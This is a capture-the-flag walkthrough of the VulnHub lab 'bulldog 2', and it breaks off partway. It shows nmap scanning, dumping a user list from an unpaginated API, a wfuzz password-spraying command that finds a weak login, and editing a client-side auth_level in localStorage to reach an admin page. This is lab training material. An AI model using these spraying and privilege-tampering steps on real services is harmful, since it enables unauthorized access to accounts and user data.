[vulnhub - easy/medium] bulldog: 1
----------------------------------

[link to the machine](https://www.vulnhub.com/entry/bulldog-2,246/)

### enumeration - external
When I access the machine's IP on my browser, I find the following:

![bulldog 1](./images/bulldog-2-1.png)

It is a social media website and the icon for it is the Angular app icon. And when checking the source of the webpage, I can see that it differs from what is actually shown on the page since Angular renders stuff dynamically. That means using gobuster is of no use.

Then I proceed to use nmap for all ports and for specific ones:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-2]
└─$ nmap -p- -T4 -oA nmap_info_allports 192.168.56.118              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-26 21:52 -03
Nmap scan report for 192.168.56.118
Host is up (0.00084s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 86.78 seconds
```

```
┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-2]
└─$ nmap -p 80 -sC -sV -Pn -oA nmap_info_detailed 10.129.82.109
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-26 21:56 -03
Nmap scan report for 10.129.82.109
Host is up.

PORT   STATE    SERVICE VERSION
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```

And it means I'll probably have to poke around the website itself, so I open OWASP ZAP to investigate it further.

When i click the "Users" button, this page opens:

![bulldog 2](./images/bulldog-2-2.png)

And the following request is registered in OWASP ZAP:

```
http://192.168.56.118/users/getUsers?limit=9
```

When I open this link on the browser, I find:

![bulldog 3](./images/bulldog-2-3.png)

So i remove the "limit" parameter from the url and get a JSON with 15800 users:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-2]
└─$ curl "http://192.168.56.118/users/getUsers" > users.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  874k  100  874k    0     0  1722k      0 --:--:-- --:--:-- --:--:-- 1724k
```

After that I go to "/register", but there is a notice that reads:

```
Unfortunately we are not accepting registrations at this time due to security concerns. If needed, please reach out to a customer support representative to create a commercial account.
```

After that I go to "/login", put some dummy data just to test the POST request, since the most likely way to go about this machine is probably bruteforcing.
I input the dummy data, and on OWASP ZAP the following is shown for the request:

```
POST http://192.168.56.118/users/authenticate HTTP/1.1
Host: 192.168.56.118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
content-type: application/json
Content-Length: 66
Origin: https://192.168.56.118
Connection: keep-alive
Referer: https://192.168.56.118/login
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
  "username": "USERNAME_DUMMY",
  "password": "PASSWORD_DUMMY"
}
```

And the response is:

```
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 28 Oct 2022 14:08:27 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 41
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"29-PaR2ao+BjJ1D0mR+rg2OQmRvUow"

{"success":false,"msg":"Incorrect Login"}
```

Then I create a python script to separate the usernames found on the JSON file because they can be used for bruteforcing:

```python
import json

file = open('users.json')
data = json.load(file)

output = open("username_list.txt", "a")

for item in data:
    username = (item['username'])
    output.write(username + '\n')

file.close()
output.close()
```

With so many usernames to probe, there's gotta be at least one of them with a weak password such as 'password', so I run wfuzz against this list:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-2]
└─$ wfuzz -c -z file,/home/j/Desktop/vulnhub/bulldog-2/username_list.txt --hc 401 -H 'Content-Type: application/json' -d '{"username": "FUZZ", "password": "password"}' http://192.168.56.118/users/authenticate
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.118/users/authenticate
Total requests: 15760

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000519:   200        0 L      3 W        470 Ch      "imsumner"                                         
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 863.9960
Processed Requests: 5512
Filtered Requests: 5511
Requests/sec.: 6.379658
```

Then I proceed to log in with username "imsumner" and password "password" and get this: 

![bulldog 4](./images/bulldog-2-4.png)

The image is a picture of the creator of the bulldog series ((@frichette_n)[https://twitter.com/frichette_n]), so I must be on the right track or he's trolling me. But apart from that, not much can be done with an account, I just get the information about it and a picture.

So I proceed to run exiftool on the image and get nothing out of it, so i open up OWASP ZAP once again to see what response I get after logging in with the right user.
The Response to the login POST request is:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 29 Oct 2022 00:27:33 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 470
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"1d6-sjmsOfq58rhtWCh7aHPUhJiA+Bk"

{"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJTdW1uZXIgWmltbWVybWFuIiwiZW1haWwiOiJzdW1uZXJ6aW1tZXJtYW5AaGFwcHltYWlsLmNvbSIsInVzZXJuYW1lIjoiaW1zdW1uZXIiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciIsInJhbmQiOjE5fSwiaWF0IjoxNjY3MDAzMjUzLCJleHAiOjE2Njc2MDgwNTN9.SvDvx9vMxOMzmeMe8tR3189etVdGDdG4bZc_r6LSbHY","user":{"name":"Sumner Zimmerman","username":"imsumner","email":"sumnerzimmerman@happymail.com","auth_level":"standard_user"}}
```

I get a JWT that is stored in local storage. Then I go to https://jwt.io/ to check out what is in this token. there is an interesting information regarding user authorization in the token's payload itself:

```json
{
  "payload": {
    "name": "Sumner Zimmerman",
    "email": "sumnerzimmerman@happymail.com",
    "username": "imsumner",
    "auth_level": "standard_user",
    "rand": 19
  },
  "iat": 1667006302,
  "exp": 1667611102
}
```

I'll have to manipulate that inside the token and save it to my local storage. But what string must I replace the "standard_user" for?
So I proceed to dig the standard source code imports for info. Digging through these files, I find in http://192.168.56.118/main.8b490782e52b9899e2a7.bundle.js:

```javascript
l.prototype.isAdmin = function() {
  var l = localStorage.getItem("user");
  return null !== l && "master_admin_user" == JSON.parse(l).auth_level
}
```

And also:

```javascript
else {
  var n = JSON.parse(l);
  if ("master_admin_user" == n.auth_level) return this.user = n, !0;
  this.router.navigate(["/"])
}
```

So what I must replace the "standard_user" string for is "master_admin_user". I do that and then update it in the local storage:

![bulldog 5](./images/bulldog-2-5.png)

![bulldog 6](./images/bulldog-2-6.png)

And just like that I get an Admin button on the webpage's navbar that redirects to http://192.168.56.118/dashboard:

![bulldog 7](./images/bulldog-2-7.png)

And unfortunately it is another login page, so i go back to digging in the js files. I find what happens on click:

```javascript
l.prototype.onLinkLoginSubmit = function() {
  var l = this,
  n = {
    username: this.username,
    password: this.password
  };
  this.authService.authenticateLinkUser(n).subscribe(function(n) {
    n.success ? (l.authService.storeUserData(n.token, n.user), l.flashMessage.show("You are now logged in", {
      cssClass: "alert-success",
      timeout: 5e3
    })) : (console.log("You have failed to authenticate"), l.flashMessage.show(n.msg, {
      cssClass: "alert-danger",
      timeout: 5e3
    }))
  })
}
```

And the authentication function:

```javascript
l.prototype.authenticateLinkUser = function(l) {
  return this.http.post("/users/linkauthenticate", l).map(function(l) {
    return l.json()
  })
}
```




